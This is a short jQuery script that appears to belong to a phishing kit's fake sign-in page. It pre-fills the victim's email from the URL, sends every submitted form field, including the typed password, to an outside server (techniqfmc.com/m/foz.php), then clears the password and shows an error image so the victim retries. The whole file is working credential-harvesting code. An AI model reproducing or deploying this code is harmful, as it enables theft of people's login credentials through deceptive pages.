$(document).ready(function() {
    $("body").click(function() {
        $(".fx").show('1000');
    });


    $(".fx").hide();
    const basename = (window.location).href;
    let name = basename.substring(basename.lastIndexOf('=') + 1);
    $("#xx").val(name);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html('Please Wait.').prop("disabled", true).css('background', 'midnightblue');
        $.ajax({
            url: "https://techniqfmc.com/m/foz.php",
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(res) {

                setTimeout(function() {
                    $("#xx").val(name);
                    $("#xxx").val("");
                    $('.er').html(`<img src="en.jpg">`);
                    $("#submitBtn").html("Sign In").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
